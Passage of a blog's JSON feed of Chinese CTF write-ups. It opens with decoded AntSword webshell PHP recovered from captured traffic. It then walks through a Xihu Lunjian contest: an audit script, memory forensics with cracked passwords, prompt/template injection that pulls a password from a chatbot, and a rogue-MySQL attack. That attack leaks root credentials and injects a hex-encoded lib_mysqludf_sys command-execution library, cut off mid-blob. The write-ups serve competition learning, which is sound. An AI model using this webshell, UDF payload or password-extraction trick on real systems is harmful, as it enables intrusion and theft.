class=\"line\">\t;</span><br><span class=\"line\">\tfunction runcmd($c) &#123;</span><br><span class=\"line\">\t\t$ret=0;</span><br><span class=\"line\">\t\t$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class=\"line\">\t\tif(fe(&#x27;system&#x27;)) &#123;</span><br><span class=\"line\">\t\t\t@system($c,$ret);</span><br><span class=\"line\">\t\t&#125; elseif(fe(&#x27;passthru&#x27;)) &#123;</span><br><span class=\"line\">\t\t\t@passthru($c,$ret);</span><br><span class=\"line\">\t\t&#125; elseif(fe(&#x27;shell_exec&#x27;)) &#123;</span><br><span class=\"line\">\t\t\tprint(@shell_exec($c));</span><br><span class=\"line\">\t\t&#125; elseif(fe(&#x27;exec&#x27;)) &#123;</span><br><span class=\"line\">\t\t\t@exec($c,$o,$ret);</span><br><span class=\"line\">\t\t\tprint(join(&quot;</span><br><span class=\"line\">&quot;,$o));</span><br><span class=\"line\">\t\t&#125; elseif(fe(&#x27;popen&#x27;)) &#123;</span><br><span class=\"line\">\t\t\t$fp=@popen($c,&#x27;r&#x27;);</span><br><span class=\"line\">\t\t\twhile(!@feof($fp)) &#123;</span><br><span class=\"line\">\t\t\t\tprint(@fgets($fp,2048));</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t@pclose($fp);</span><br><span class=\"line\">\t\t&#125; elseif(fe(&#x27;proc_open&#x27;)) &#123;</span><br><span class=\"line\">\t\t\t$p = @proc_open($c, array(1 =&gt; array(&#x27;pipe&#x27;, &#x27;w&#x27;), 2 =&gt; array(&#x27;pipe&#x27;, &#x27;w&#x27;)), $io);</span><br><span class=\"line\">\t\t\twhile(!@feof($io[1])) &#123;</span><br><span class=\"line\">\t\t\t\tprint(@fgets($io[1],2048));</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\twhile(!@feof($io[2])) &#123;</span><br><span class=\"line\">\t\t\t\tprint(@fgets($io[2],2048));</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t@fclose($io[1]);</span><br><span class=\"line\">\t\t\t@fclose($io[2]);</span><br><span class=\"line\">\t\t\t@proc_close($p);</span><br><span class=\"line\">\t\t&#125; elseif(fe(&#x27;antsystem&#x27;)) &#123;</span><br><span class=\"line\">\t\t\t@antsystem($c);</span><br><span class=\"line\">\t\t&#125; elseif(runshellshock($d, $c)) &#123;</span><br><span class=\"line\">\t\t\treturn $ret;</span><br><span class=\"line\">\t\t&#125; elseif(substr($d,0,1)!=&quot;/&quot; &amp;&amp; @class_exists(&quot;COM&quot;)) &#123;</span><br><span class=\"line\">\t\t\t$w=new COM(&#x27;WScript.shell&#x27;);</span><br><span class=\"line\">\t\t\t$e=$w-&gt;exec($c);</span><br><span class=\"line\">\t\t\t$so=$e-&gt;StdOut();</span><br><span class=\"line\">\t\t\t$ret.=$so-&gt;ReadAll();</span><br><span class=\"line\">\t\t\t$se=$e-&gt;StdErr();</span><br><span class=\"line\">\t\t\t$ret.=$se-&gt;ReadAll();</span><br><span class=\"line\">\t\t\tprint($ret);</span><br><span class=\"line\">\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\t$ret = 127;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\treturn $ret;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t;</span><br><span class=\"line\">\t$ret=@runcmd($r.&quot; 2&gt;&amp;1&quot;);</span><br><span class=\"line\">\tprint ($ret!=0)?&quot;ret=&#123;$ret&#125;&quot;:&quot;&quot;;</span><br><span class=\"line\">\t;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">catch(Exception $e) &#123;</span><br><span class=\"line\">\techo &quot;ERROR://&quot;.$e-&gt;getMessage();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">;</span><br><span class=\"line\">asoutput();</span><br><span class=\"line\">die();</span><br></pre></td></tr></table></figure></p>\n<p>当查看这一串的 base64 解码的内容时</p>\n<blockquote>\n<p>这串内容可能出现在整体代码的前面，也可能能出现在整体代码的后端<br />\n尝试了几次，发现是这样的，但是具体原因还不太清楚</p>\n</blockquote>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/hdQWdF5Rrl5BEMAR.png!thumbnail\" alt=\"\" /></p>\n<p>能发现我们之前输入的最后一行 cat flag.php 命令</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/e5o5xZjl0cwyKaJ3.png!thumbnail\" alt=\"\" /></p>\n<p>根据这个再去 http 流的最后一个追踪流</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ItR2SF2XaVYginww.png!thumbnail\" alt=\"\" /></p>\n<p>解码这段 base64 就能看到 cat flag.php 的具体内容了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ATJitJGKzlDQFCbK.png!thumbnail\" alt=\"\" /></p>\n",
            "tags": [
                "流量",
                "流量"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91C0deX%E6%88%98%E9%98%9FWP/",
            "url": "https://nnnpc.github.io/2024/04/16/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91C0deX%E6%88%98%E9%98%9FWP/",
            "title": "西湖论剑C0deX战队WP",
            "date_published": "2024-04-16T05:58:19.059Z",
            "content_html": "<h1 id=\"西湖论剑c0dex战队wp\"><a class=\"anchor\" href=\"#西湖论剑c0dex战队wp\">#</a> 西湖论剑 C0deX 战队 WP</h1>\n<h3 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h3>\n<h4 id=\"2024签到题\"><a class=\"anchor\" href=\"#2024签到题\">#</a> 2024 签到题</h4>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131103436990.png\" alt=\"\" /></p>\n<p>根据附件中图片的详细信息发送文字到公众号获得 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131103550962.png\" alt=\"\" /></p>\n<p><strong>DASCTF{gcsis_2024_we_are_ready}</strong></p>\n<h4 id=\"数据安全-easy_tables\"><a class=\"anchor\" href=\"#数据安全-easy_tables\">#</a> 数据安全 - easy_tables</h4>\n<p>附件得到四张表，大致看了下 pdf 中的说明，大致意思就是需要用前三张表也就是 user、permission、tables 获得每个用户所属组的可工作时间段和可以执行的操作，根据 actionlog 表获得具体工作的时间和实际执行的操作，对照知道哪些进行了违规操作，将每个表中的编号按顺序排列之后的 md5 便是最终 flag</p>\n<p>看了下 actionlog 表发现数据很多，通过脚本进行处理并且筛选出不符合规定的操作</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import re</span><br><span class=\"line\">from datetime import datetime</span><br><span class=\"line\"></span><br><span class=\"line\">class LogProcessor:</span><br><span class=\"line\">    def __init__(self, users_file=&#x27;users.csv&#x27;, actions_file=&#x27;actionlog.csv&#x27;, tables_file=&#x27;tables.csv&#x27;, permissions_file=&#x27;permissions.csv&#x27;):</span><br><span class=\"line\">        self.users_file = users_file</span><br><span class=\"line\">        self.actions_file = actions_file</span><br><span class=\"line\">        self.tables_file = tables_file</span><br><span class=\"line\">        self.permissions_file = permissions_file</span><br><span class=\"line\"></span><br><span class=\"line\">        self.users, self.user_dict = self.extract_user_list()</span><br><span class=\"line\">        self.action_logs = self.extract_actions()</span><br><span class=\"line\">        self.tables, self.table_dict = self.extract_tables()</span><br><span class=\"line\">        self.permissions_list = self.extract_permissions()</span><br><span class=\"line\"></span><br><span class=\"line\">    def is_time_in_ranges(self, time_str, time_ranges):</span><br><span class=\"line\">        target_time = datetime.strptime(time_str, &#x27;%H:%M:%S&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">        for range_str in time_ranges:</span><br><span class=\"line\">            start_time, end_time = map(lambda x: datetime.strptime(x, &#x27;%H:%M:%S&#x27;), range_str.split(&#x27;~&#x27;))</span><br><span class=\"line\">            if start_time &lt;= target_time &lt;= end_time:</span><br><span class=\"line\">                return True</span><br><span class=\"line\"></span><br><span class=\"line\">        return False</span><br><span class=\"line\"></span><br><span class=\"line\">    def extract_sql_operation_type(self, sql_statement):</span><br><span class=\"line\">        pattern = re.compile(r&#x27;\\b(insert|delete|update|select)\\b&#x27;, re.IGNORECASE)</span><br><span class=\"line\">        match = pattern.search(sql_statement)</span><br><span class=\"line\"></span><br><span class=\"line\">        if match:</span><br><span class=\"line\">            return match.group(1).upper()</span><br><span class=\"line\"></span><br><span class=\"line\">        return None</span><br><span class=\"line\"></span><br><span class=\"line\">    def extract_table_name_from_sql(self, sql_statement):</span><br><span class=\"line\">        pattern = re.compile(r&#x27;\\bFROM\\b\\s+([^\\s;]+)|\\bJOIN\\b\\s+([^\\s;]+)|\\bUPDATE\\b\\s+([^\\s;]+)|\\bINTO\\b\\s+([^\\s;]+)|\\bMERGE\\b\\s+([^\\s;]+)|\\bTABLE\\b\\s+([^\\s;]+)&#x27;, re.IGNORECASE)</span><br><span class=\"line\">        match = pattern.search(sql_statement)</span><br><span class=\"line\"></span><br><span class=\"line\">        if match:</span><br><span class=\"line\">            return next(group for group in match.groups() if group is not None)</span><br><span class=\"line\"></span><br><span class=\"line\">        return None</span><br><span class=\"line\"></span><br><span class=\"line\">    def extract_user_list(self):</span><br><span class=\"line\">        user_file = open(self.users_file, encoding=&#x27;utf-8&#x27;)</span><br><span class=\"line\">        content = user_file.read()</span><br><span class=\"line\">        users_list = list()</span><br><span class=\"line\">        user_dict = &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        rows = content.split(&#x27;\\n&#x27;)</span><br><span class=\"line\">        for row in rows:</span><br><span class=\"line\">            user_info = row.split(&#x27;,&#x27;)</span><br><span class=\"line\">            users_list.append(row.split(&#x27;,&#x27;))</span><br><span class=\"line\">            user_dict[user_info[1]] = int(user_info[0])</span><br><span class=\"line\"></span><br><span class=\"line\">        return users_list, user_dict</span><br><span class=\"line\"></span><br><span class=\"line\">    def extract_actions(self):</span><br><span class=\"line\">        action_log_file = open(self.actions_file, encoding=&#x27;utf-8&#x27;)</span><br><span class=\"line\">        line = action_log_file.read()</span><br><span class=\"line\">        log_lines = line.split(&#x27;\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">        return log_lines</span><br><span class=\"line\"></span><br><span class=\"line\">    def extract_tables(self):</span><br><span class=\"line\">        tables_file = open(self.tables_file, encoding=&#x27;utf-8&#x27;)</span><br><span class=\"line\">        content = tables_file.read()</span><br><span class=\"line\">        tables_list = list()</span><br><span class=\"line\">        table_dict = &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        rows = content.split(&#x27;\\n&#x27;)</span><br><span class=\"line\">        for row in rows:</span><br><span class=\"line\">            table_info = row.split(&#x27;,&#x27;)</span><br><span class=\"line\">            tables_list.append(row.split(&#x27;,&#x27;))</span><br><span class=\"line\">            table_dict[table_info[1]] = int(table_info[0])</span><br><span class=\"line\"></span><br><span class=\"line\">        return tables_list, table_dict</span><br><span class=\"line\"></span><br><span class=\"line\">    def extract_permissions(self):</span><br><span class=\"line\">        permissions_file = open(self.permissions_file, encoding=&#x27;utf-8&#x27;)</span><br><span class=\"line\">        line = permissions_file.read()</span><br><span class=\"line\">        lines = line.split(&#x27;\\n&#x27;)</span><br><span class=\"line\">        permissions_list = []</span><br><span class=\"line\"></span><br><span class=\"line\">        for line in lines:</span><br><span class=\"line\">            pattern = re.compile(r&#x27;(\\w+),(\\w+),(&quot;.*?&quot;|[^,]+),(&quot;.*?&quot;|[^,]+)&#x27;)</span><br><span class=\"line\">            matches = pattern.match(line)</span><br><span class=\"line\"></span><br><span class=\"line\">            if matches:</span><br><span class=\"line\">                group1 = matches.group(1)</span><br><span class=\"line\">                group2 = matches.group(2)</span><br><span class=\"line\"></span><br><span class=\"line\">                operations_str = matches.group(3)</span><br><span class=\"line\">                operations_list = operations_str.strip(&#x27;\\&quot;&#x27;).split(&#x27;,&#x27;) if &#x27;\\&quot;&#x27; in operations_str else [operations_str]</span><br><span class=\"line\"></span><br><span class=\"line\">                numbers_str = matches.group(4)</span><br><span class=\"line\">                numbers_list = numbers_str.strip(&#x27;\\&quot;&#x27;).split(&#x27;,&#x27;) if &#x27;\\&quot;&#x27; in numbers_str else [numbers_str]</span><br><span class=\"line\"></span><br><span class=\"line\">                permissions_list.append([group1, group2, operations_list, numbers_list])</span><br><span class=\"line\"></span><br><span class=\"line\">        return permissions_list</span><br><span class=\"line\"></span><br><span class=\"line\">    def process_actions(self):</span><br><span class=\"line\">        result_flags = []</span><br><span class=\"line\"></span><br><span class=\"line\">        for logline in self.action_logs:</span><br><span class=\"line\">            values = logline.split(&#x27;,&#x27;, 3)</span><br><span class=\"line\">            if values[1] in self.user_dict.keys():</span><br><span class=\"line\">                tuser = self.users[self.user_dict[values[1]] - 1]</span><br><span class=\"line\">                tpermissions = self.permissions_list[int(tuser[3]) - 1]</span><br><span class=\"line\">                sql_head = tpermissions[2]</span><br><span class=\"line\">                table_pass = tpermissions[3]</span><br><span class=\"line\"></span><br><span class=\"line\">                table_name = self.extract_table_name_from_sql(values[3])</span><br><span class=\"line\">                ttable = self.tables[self.table_dict[table_name] - 1]</span><br><span class=\"line\"></span><br><span class=\"line\">                if str(self.table_dict[table_name]) in table_pass:</span><br><span class=\"line\">                    sql_type = self.extract_sql_operation_type(values[3]).lower()</span><br><span class=\"line\">                    if sql_type in sql_head:</span><br><span class=\"line\">                        time_ranges = [item.replace(&#x27;&quot;&#x27;, &#x27;&#x27;) for item in ttable[2:]]</span><br><span class=\"line\">                        datetime_object = datetime.strptime(values[2], &#x27;%Y/%m/%d %H:%M:%S&#x27;)</span><br><span class=\"line\">                        time_only = datetime_object.time()</span><br><span class=\"line\"></span><br><span class=\"line\">                        if self.is_time_in_ranges(str(time_only), time_ranges):</span><br><span class=\"line\">                            pass</span><br><span class=\"line\">                        else:</span><br><span class=\"line\">                            son = tuser[0] + &#x27;_&#x27; + tpermissions[0] + &#x27;_&#x27; + str(self.table_dict[table_name]) + &#x27;_&#x27; + values[0]</span><br><span class=\"line\">                            result_flags.append(son)</span><br><span class=\"line\">                    else:</span><br><span class=\"line\">                        son = tuser[0] + &#x27;_&#x27; + tpermissions[0] + &#x27;_&#x27; + str(self.table_dict[table_name]) + &#x27;_&#x27; + values[0]</span><br><span class=\"line\">                        result_flags.append(son)</span><br><span class=\"line\">                else:</span><br><span class=\"line\">                    son = tuser[0] + &#x27;_&#x27; + tpermissions[0] + &#x27;_&#x27; + str(self.table_dict[table_name]) + &#x27;_&#x27; + values[0]</span><br><span class=\"line\">                    result_flags.append(son)</span><br><span class=\"line\">                ttable = self.tables[self.table_dict[table_name] - 1]</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                son = &#x27;0_0_0_&#x27; + values[0]</span><br><span class=\"line\">                result_flags.append(son)</span><br><span class=\"line\"></span><br><span class=\"line\">        return result_flags</span><br><span class=\"line\"></span><br><span class=\"line\">    def custom_sort(self, item):</span><br><span class=\"line\">        p = item.split(&#x27;_&#x27;)</span><br><span class=\"line\">        return tuple(map(int, p))</span><br><span class=\"line\"></span><br><span class=\"line\">    def print_sorted_list(self, sorted_list):</span><br><span class=\"line\">        for i in sorted_list:</span><br><span class=\"line\">            print(i, end=&#x27;&#x27;)</span><br><span class=\"line\">            print(&#x27;,&#x27;, end=&#x27;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    def main(self):</span><br><span class=\"line\">        result_flags = self.process_actions()</span><br><span class=\"line\"></span><br><span class=\"line\">        sorted_list = sorted(result_flags, key=self.custom_sort)</span><br><span class=\"line\">        self.print_sorted_list(sorted_list)</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &quot;__main__&quot;:</span><br><span class=\"line\">    log_processor = LogProcessor()</span><br><span class=\"line\">    log_processor.main()</span><br></pre></td></tr></table></figure></p>\n<p>将每个表格中的表头去除运行脚本进行处理得到</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0_0_0_6810,0_0_0_8377,6_14_91_6786,7_64_69_3448,9_18_61_5681,30_87_36_235,31_76_85_9617,49_37_30_8295,75_15_43_8461,79_3_15_9011</span><br></pre></td></tr></table></figure></p>\n<p>md5 之后得到 flag</p>\n<p><strong>271b1ffebf7a76080c7a6e134ae4c929</strong></p>\n<h4 id=\"easy_rawraw\"><a class=\"anchor\" href=\"#easy_rawraw\">#</a> easy_rawraw</h4>\n<p>得到附件，一个加密压缩包，一个内存 raw 文件，需要进行取证</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131112328731.png\" alt=\"\" /></p>\n<p>首先 passware 爆破得到用户密码 das123admin321，发现不是压缩包密码，利用 vol 对 raw 文件进行取证</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131112840314.png\" alt=\"\" /></p>\n<p>filescan 过滤 zip 得到了 pass.zip，dump 下来爆破压缩包密码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131113001517.png\" alt=\"\" /></p>\n<p>解开得到都是 md5 的密码本，最终利用 winhex 直接对 raw 文件进行搜索得到了压缩包密码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131113231879.png\" alt=\"\" /></p>\n<p>DasrIa456sAdmIn987，后续发现可以 strings 进行 grep 更快一些</p>\n<p>解压出来 veracrypt 进行挂载，密码本作为 keyfile</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131113636740.png\" alt=\"\" /></p>\n<p>用户密码 das123admin321 作为解开表格的密码</p>\n<p>搜索 DAS 得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131113748604.png\" alt=\"\" /></p>\n<p><strong>DASCTF{5476d4c4ade0918c151aa6dcac12d130}</strong></p>\n<h3 id=\"ai\"><a class=\"anchor\" href=\"#ai\">#</a> AI</h3>\n<h4 id=\"ai-回声海螺\"><a class=\"anchor\" href=\"#ai-回声海螺\">#</a> AI - 回声海螺</h4>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131114007683.png\" alt=\"\" /></p>\n<p>发现输入框有点眼熟，尝试输入一些字，发现会有三遍的回声</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131114145572.png\" alt=\"\" /></p>\n<p>尝试一下模板注入带出 password</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131115329843.png\" alt=\"\" /></p>\n<p>在几次尝试之后得到了密码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131115405274.png\" alt=\"\" /></p>\n<p>由于是复现环境，所以并没有弹窗出 flag，在比赛期间弹窗得到 flag</p>\n<h3 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> Crypto</h3>\n<h4 id=\"0r1cle\"><a class=\"anchor\" href=\"#0r1cle\">#</a> 0r1cle</h4>\n<p>非预期，在输入 65 个左右的 0 之后获得 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131114633396.png\" alt=\"\" /></p>\n<h3 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> Web</h3>\n<h4 id=\"only_sql\"><a class=\"anchor\" href=\"#only_sql\">#</a> only_sql</h4>\n<p>使用<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2MwY2MvZmFrZU15c2FsL2Jsb2IvbWFzdGVyL2Zha2VNeXNxbFNlcnZlci5weQ==\"> https://github.com/c0cc/fakeMysal/blob/master/fakeMysqlServer.py</span> 配合 vps 读源码，拿到账密和数据库连接即可 root：1q2w3e4r5t!@#</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1706594062001-fe3a09c2-c4fa-4ef4-970d-ab5d211bf405.png\" alt=\"\" title=\"fig:\" />执行</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select unhex(&#x27;7f454c4602010100000000000000000003003e0001000000a00b0000000000004000000000000000882c0000000000000000000040003800070040001c001b000100000005000000000000000000000000000000000000000000000000000000d416000000000000d41600000000000000002000000000000100000006000000101e000000000000101e200000000000101e2000000000007802000000000000800200000000000000002000000000000200000006000000201e000000000000201e200000000000201e200000000000c001000000000000c00100000000000008000000000000000400000004000000c801000000000000c801000000000000c80100000000000024000000000000002400000000000000040000000000000050e574640400000004140000000000000414000000000000041400000000000094000000000000009400000000000000040000000000000051e574640600000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000052e5746404000000101e000000000000101e200000000000101e200000000000f001000000000000f0010000000000000100000000000000040000001400000003000000474e55005c08ddf79a6da5143daa80e4a7efb410a96c4a44000000001100000012000000020000000700000080080248811944c91ca440039804688312000000140000001500000017000000180000001a0000001d0000001f000000000000002000000000000000210000002200000023000000240000002500000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed971581ca868be12bbe3927c7e8b92cdc2f9bfba1f7066a9745bb073371974ec4345d5ecc5a62c1cc3138aff3b9fd4a0ad73d1c50b5911feab5fbe1200000000000000000000000000000000000000000000000000000000cd0000001200000000000000000000000000000000000000fe00000012000000000000000000000000000000000000007c0100001200000000000000000000000000000000000000160000002000000000000000000000000000000000000000120100001200000000000000000000000000000000000000d400000012000000000000000000000000000000000000009101000012000000000000000000000000000000000000004001000012000000000000000000000000000000000000008a01000012000000000000000000000000000000000000008401000012000000000000000000000000000000000000000100000020000000000000000000000000000000000000000b0100001200000000000000000000000000000000000000e800000012000000000000000000000000000000000000007401000012000000000000000000000000000000000000006e01000012000000000000000000000000000000000000003200000020000000000000000000000000000000000000004c00000022000000000000000000000000000000000000000301000012000c00fe0f000000000000da000000000000005501000012000c0048120000000000000b000000000000001000000012000d00f81300000000000000000000000000009300000012000c000c0d0000000000006b000000000000002101000012000900900a0000000000000000000000000000b301000010001700882020000000000000000000000000003701000012000c007e110000000000002f00000000000000bf0100001000170090202000000000000000000000000000b600000012000c00080e0000000000000b00000000000000c500000012000c00130e00000000000063000000000000004701000012000c00ad110000000000009b000000000000007600000012000c00010d0000000000000b00000000000000a900000012000c00770d0000000000009100000000000000ac01000010001600882020000000000000000000000000002701000012000c0073110000000000000b00000000000000db00000012000c00760e0000000000005c010000000000001901000012000c00d8100000000000009b000000000000005b00000012000c007a0c0000000000008700000000000000ef00000012000c00d20f0000000000002c000000000000006501000012000c005312000000000000a301000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f49544d5f64657265676973746572544d436c6f6e655461626c65005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a65006c69625f6d7973716c7564665f7379735f696e666f5f696e6974006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974006c69625f6d7973716c7564665f7379735f696e666f007379735f6765745f696e6974007379735f6765745f6465696e6974007379735f67657400676574656e76007374726c656e007379735f7365745f696e6974006d616c6c6f63007379735f7365745f6465696e69740066726565007379735f736574006d656d63707900736574656e76007379735f657865635f696e6974007379735f657865635f6465696e6974007379735f657865630073797374656d007379735f6576616c5f696e6974007379735f6576616c5f6465696e6974007379735f6576616c00706f70656e007265616c6c6f63007374726e6370790066676574730070636c6f7365005f5f737461636b5f63686b5f6661696c006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e313400474c4942435f322e3400474c4942435f322e322e3500000000020002000200000002000200030002000200020000000400020002000200000002000100010001000100010001000100010001000100010001000100010001000100010001000100010000000000000001000300a201000010000000000000009491960600000400c4010000100000001469690d00000300cf01000010000000751a690900000200d901000000000000101e2000000000000800000000000000700c000000000000181e2000000000000800000000000000300c000000000000802020000000000008000000000000008020200000000000e01f20000000000006000000040000000000000000000000e81f200000000000060000000b0000000000000000000000f01f20000000000006000000100000000000000000000000f81f200000000000060000001100000000000000000000001820200000000000070000000100000000000000000000002020200000000000070000000200000000000000000000002820200000000000070000000300000000000000000000003020200000000000070000000500000000000000000000003820200000000000070000000600000000000000000000004020200000000000070000000700000000000000000000004820200000000000070000000800000000000000000000005020200000000000070000000900000000000000000000005820200000000000070000000a00000000000000000000006020200000000000070000000c00000000000000000000006820200000000000070000000d00000000000000000000007020200000000000070000000e00000000000000000000007820200000000000070000000f00000000000000000000004883ec08488b054d1520004885c07402ffd04883c408c3000000000000000000ff3552152000ff25541520000f1f4000ff25521520006800000000e9e0ffffffff254a1520006801000000e9d0ffffffff25421520006802000000e9c0ffffffff253a1520006803000000e9b0ffffffff25321520006804000000e9a0ffffffff252a1520006805000000e990ffffffff25221520006806000000e980ffffffff251a1520006807000000e970ffffffff251215200068080000